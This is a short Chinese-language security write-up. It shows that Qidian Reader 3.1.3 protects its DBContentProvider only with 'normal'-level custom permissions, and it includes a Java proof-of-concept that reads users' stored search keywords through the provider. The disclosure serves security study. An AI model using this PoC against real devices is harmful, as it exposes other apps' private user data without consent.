测试的版本是3.1.3，这个版本的起点阅读有一个DBContentProvider组件，注册信息如下，使用了两个私有权限

<provider 
    android:authorities="com.qidian.QDReader" 
    android:name="com.qidian.QDReader.DataAccess.DBContentProvider" 
    android:readPermission="com.qidian.QDReader.permission.READ_DB" 
    android:writePermission="com.qidian.QDReader.permission.WRITE_DB" />

两个私有权限定义如下，保护等级是normal，等于没有保护，我们直接申请权限即可调用

<permission android:label="读取起点读书数据" android:name="com.qidian.QDReader.permission.READ_DB" android:protectionLevel="normal" />
<permission android:label="写入起点读书数据" android:name="com.qidian.QDReader.permission.WRITE_DB" android:protectionLevel="normal" />

最关键的一点，这个样本太古老了

<uses-sdk android:minSdkVersion="4" />

所以是存在漏洞的，小样你的混淆做的很骚气啊

构造Poc

public class MainActivity extends Activity {

    static final String TAG = "toT0C";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse("content://com.qidian.QDReader/searchkey");
            cursor = contentResolver.query(uri_query, null, null, null, null);
            while (cursor.moveToNext()) {
                if (cursor != null) {
                    String keyword = cursor.getString(cursor.getColumnIndex("Keyword"));
                    Log.i(TAG, keyword);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
